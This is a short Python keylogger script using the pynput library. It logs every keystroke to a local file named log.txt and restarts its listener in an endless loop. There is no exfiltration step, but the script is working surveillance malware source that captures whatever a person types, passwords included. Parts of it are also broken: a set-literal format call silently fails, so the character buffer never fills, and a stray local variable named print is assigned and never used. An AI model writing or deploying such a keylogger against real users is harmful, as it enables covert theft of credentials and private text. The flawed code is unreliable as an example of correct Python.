import pynput 
from pynput.keyboard import Key, Listener 
   
keys = [] 
char=" "  
def on_press(key): 
    global char 
    keys.append(key)
    write_file(keys)               # log.txt-File

    try:
        char +=({0}.format(key.char))

    except AttributeError: 
        pass
           
def write_file(keys): 
      
    with open('log.txt', 'w') as f: 
        for key in keys:               
            k = str(key).replace("'", "")
            print = str(key).replace("'", "")
            f.write(k)                                 
            f.write(' ')  
               
def on_release(key): 
                      
#    print('{0} released'.format(key)) 
    if key == Key.enter: 
        
        return False
while True:    
    with Listener(on_press = on_press, 
              on_release = on_release) as listener: 
                      
        
    
        

        listener.join()
        print('keys= ', keys,)
        print('char= ', char)
